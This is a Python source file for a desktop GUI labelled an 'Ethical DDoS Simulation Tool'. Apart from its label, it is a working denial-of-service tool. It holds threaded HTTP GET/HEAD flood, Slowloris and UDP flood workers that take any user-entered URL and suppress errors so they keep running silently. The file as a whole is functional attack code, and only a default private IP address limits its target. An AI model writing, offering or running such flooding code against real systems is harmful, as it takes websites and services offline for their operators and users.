import tkinter as tk
from tkinter import ttk, messagebox
import socket
import threading
import time
import random
import sys
from urllib.parse import urlparse

# --- Global Configuration and Attack Parameters ---
# These will be set by the GUI inputs
target_url = ""
target_host = ""
target_port = 0
target_path = "/"
num_threads = 0
packet_size = 0
headers_interval = 0
attack_type = ""

# Control variables for threads
running_event = threading.Event()
active_threads_count = 0
threads_list = [] # To keep track of thread objects

# User-Agents and Common Headers (same as before for realism)
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
]

COMMON_HEADERS = [
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language: en-US,en;q=0.5",
    "Connection: keep-alive",
    "Upgrade-Insecure-Requests: 1",
    "Cache-Control: no-cache",
    "Pragma: no-cache",
]

# --- Attack Worker Functions (adapted for GUI and control variables) ---

def http_flood_worker(thread_id, target_host, target_port, path, request_type):
    global active_threads_count
    active_threads_count += 1
    try:
        while running_event.is_set(): # Loop as long as the event is set
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            try:
                s.connect((target_host, target_port))
                
                headers = [
                    f"{request_type} {path} HTTP/1.1",
                    f"Host: {target_host}",
                    f"User-Agent: {random.choice(USER_AGENTS)}"
                ]
                for _ in range(random.randint(0, 3)):
                    headers.append(random.choice(COMMON_HEADERS))
                
                if "Connection: keep-alive" not in headers:
                     headers.append("Connection: keep-alive")

                request = "\r\n".join(headers) + "\r\n\r\n"
                s.sendall(request.encode())
                
            except socket.error:
                pass
            finally:
                if s: s.close()
            
            # Small sleep to yield CPU. Adjust as needed for your testing machine.
            # time.sleep(0.001) 

    except Exception:
        pass # Suppress errors for worker threads to keep them running silently
    finally:
        active_threads_count -= 1

def slowloris_worker(thread_id, target_host, target_port, headers_interval):
    global active_threads_count
    active_threads_count += 1
    sock = None
    try:
        while running_event.is_set():
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            try:
                sock.connect((target_host, target_port))
                
                user_agent = random.choice(USER_AGENTS)
                initial_request = (
                    f"GET / HTTP/1.1\r\n"
                    f"Host: {target_host}\r\n"
                    f"User-Agent: {user_agent}\r\n"
                )
                sock.sendall(initial_request.encode())

                while running_event.is_set():
                    keep_alive_header = f"X-Keep-Alive-{random.randint(1, 100000)}: {random.randint(1, 100000)}\r\n"
                    sock.sendall(keep_alive_header.encode())
                    time.sleep(headers_interval)

            except socket.timeout:
                pass
            except socket.error:
                pass
            except Exception:
                pass
            finally:
                if sock:
                    sock.close()
                time.sleep(1) # Small delay before attempting to reconnect

    except Exception:
        pass
    finally:
        active_threads_count -= 1

def udp_flood_worker(thread_id, target_ip, start_port, end_port, packet_size):
    global active_threads_count
    active_threads_count += 1
    try:
        while running_event.is_set():
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            target_port = random.randint(start_port, end_port)
            dummy_data = bytes([random.randint(0, 255) for _ in range(packet_size)])

            try:
                s.sendto(dummy_data, (target_ip, target_port))
            except socket.error:
                pass
            finally:
                s.close()
            
            # time.sleep(0.0001)

    except Exception:
        pass
    finally:
        active_threads_count -= 1

# --- GUI Functions ---

def start_attack():
    global target_url, target_host, target_port, target_path, num_threads, \
           packet_size, headers_interval, attack_type, active_threads_count, threads_list

    # Get values from GUI inputs
    target_url = url_entry.get()
    try:
        num_threads = int(threads_entry.get())
        packet_size = int(packet_size_entry.get())
        headers_interval = int(interval_entry.get())
        attack_type = attack_type_combobox.get()
    except ValueError:
        messagebox.showerror("Input Error", "Please enter valid numbers for threads, packet size, and interval.")
        return

    if not target_url:
        messagebox.showerror("Input Error", "Please enter a Target URL.")
        return

    # Parse URL
    parsed_url = urlparse(target_url)
    target_host = parsed_url.hostname
    target_path = parsed_url.path if parsed_url.path else "/"
    if parsed_url.query:
        target_path += "?" + parsed_url.query

    if not target_host:
        messagebox.showerror("Input Error", "Invalid URL. Please provide a full URL like http://192.168.1.100/.")
        return

    target_port = parsed_url.port
    if not target_port:
        if parsed_url.scheme == "https":
            target_port = 443
        else:
            target_port = 80

    if num_threads <= 0 or packet_size <= 0 or headers_interval <= 0:
        messagebox.showerror("Input Error", "Numbers must be positive.")
        return

    # Ensure previous threads are stopped before starting new ones
    stop_attack(silence=True) 
    threads_list = []
    active_threads_count = 0
    running_event.set() # Set the event to signal threads to start

    status_label.config(text=f"Starting {attack_type} on {target_url} with {num_threads} threads...")
    log_message(f"Attack initiated: {attack_type} on {target_url} ({target_host}:{target_port}) with {num_threads} threads.")

    for i in range(num_threads):
        if attack_type in ["http-get", "http-head"]:
            thread = threading.Thread(target=http_flood_worker, args=(i, target_host, target_port, target_path, attack_type.upper()))
        elif attack_type == "slowloris":
            thread = threading.Thread(target=slowloris_worker, args=(i, target_host, target_port, headers_interval))
        elif attack_type == "udp-flood":
            thread = threading.Thread(target=udp_flood_worker, args=(i, target_host, 1, 65535, packet_size))
        
        thread.daemon = True # Daemon threads exit when main program exits
        threads_list.append(thread)
        thread.start()
        time.sleep(0.01) # Stagger thread starts slightly

    update_status_gui() # Start updating status

def stop_attack(silence=False):
    global active_threads_count, threads_list
    if running_event.is_set():
        running_event.clear() # Clear the event to signal threads to stop
        if not silence:
            status_label.config(text="Stopping attack. Please wait for threads to terminate...")
            log_message("Stopping attack...")
        
        # Wait for threads to actually finish their current loops and exit
        # This join can block the GUI, so we might need to update active_threads_count
        # in a separate loop or rely on daemon threads.
        # For simplicity with GUI, we just clear the event and let them die or finish.
        threads_list = [] # Clear the list to remove references

    if not silence:
        status_label.config(text="Attack Stopped.")
        log_message("Attack stopped.")
    update_status_gui() # Update one last time

def update_status_gui():
    thread_status_label.config(text=f"Active Threads: {active_threads_count}")
    if running_event.is_set():
        root.after(1000, update_status_gui) # Update every 1 second

def log_message(message):
    log_text.insert(tk.END, f"[{time.strftime('%H:%M:%S')}] {message}\n")
    log_text.see(tk.END) # Auto-scroll to the bottom

# --- GUI Layout ---
root = tk.Tk()
root.title("Ethical DDoS Simulation Tool")
root.geometry("600x600") # Initial window size
root.resizable(False, False) # Disable resizing for simplicity

# Frame for input controls
input_frame = ttk.LabelFrame(root, text="Attack Configuration", padding="10")
input_frame.pack(padx=10, pady=10, fill="x")

# Target URL
ttk.Label(input_frame, text="Target URL:").grid(row=0, column=0, padx=5, pady=5, sticky="w")
url_entry = ttk.Entry(input_frame, width=50)
url_entry.grid(row=0, column=1, padx=5, pady=5, sticky="ew")
url_entry.insert(0, "http://192.168.1.100/") # Default value, CHANGE THIS

# Number of Threads
ttk.Label(input_frame, text="Num Threads:").grid(row=1, column=0, padx=5, pady=5, sticky="w")
threads_entry = ttk.Entry(input_frame, width=10)
threads_entry.grid(row=1, column=1, padx=5, pady=5, sticky="w")
threads_entry.insert(0, "100")

# Attack Type
ttk.Label(input_frame, text="Attack Type:").grid(row=2, column=0, padx=5, pady=5, sticky="w")
attack_type_combobox = ttk.Combobox(input_frame, 
                                    values=["http-get", "http-head", "slowloris", "udp-flood"],
                                    state="readonly")
attack_type_combobox.set("http-get") # Default attack type
attack_type_combobox.grid(row=2, column=1, padx=5, pady=5, sticky="w")

# Packet Size (for UDP)
ttk.Label(input_frame, text="Packet Size (Bytes):").grid(row=3, column=0, padx=5, pady=5, sticky="w")
packet_size_entry = ttk.Entry(input_frame, width=10)
packet_size_entry.grid(row=3, column=1, padx=5, pady=5, sticky="w")
packet_size_entry.insert(0, "1024")

# Headers Interval (for Slowloris)
ttk.Label(input_frame, text="Headers Interval (Sec):").grid(row=4, column=0, padx=5, pady=5, sticky="w")
interval_entry = ttk.Entry(input_frame, width=10)
interval_entry.grid(row=4, column=1, padx=5, pady=5, sticky="w")
interval_entry.insert(0, "5")

# Buttons Frame
button_frame = ttk.Frame(root, padding="10")
button_frame.pack(padx=10, pady=5, fill="x")

start_button = ttk.Button(button_frame, text="Start Attack", command=start_attack)
start_button.pack(side="left", padx=5, expand=True, fill="x")

stop_button = ttk.Button(button_frame, text="Stop Attack", command=stop_attack)
stop_button.pack(side="left", padx=5, expand=True, fill="x")

# Status and Thread Count
status_label = ttk.Label(root, text="Ready to start.", font=("Arial", 10, "bold"))
status_label.pack(padx=10, pady=5, fill="x")

thread_status_label = ttk.Label(root, text="Active Threads: 0", font=("Arial", 9))
thread_status_label.pack(padx=10, pady=2, fill="x")


# Log Area
log_frame = ttk.LabelFrame(root, text="Log Output", padding="10")
log_frame.pack(padx=10, pady=10, fill="both", expand=True)

log_text = tk.Text(log_frame, wrap="word", height=10, state="normal") # Use state="normal" to allow inserting
log_text.pack(fill="both", expand=True)
log_scroll = ttk.Scrollbar(log_frame, command=log_text.yview)
log_scroll.pack(side="right", fill="y")
log_text.config(yscrollcommand=log_scroll.set)

# Start GUI event loop
root.mainloop()
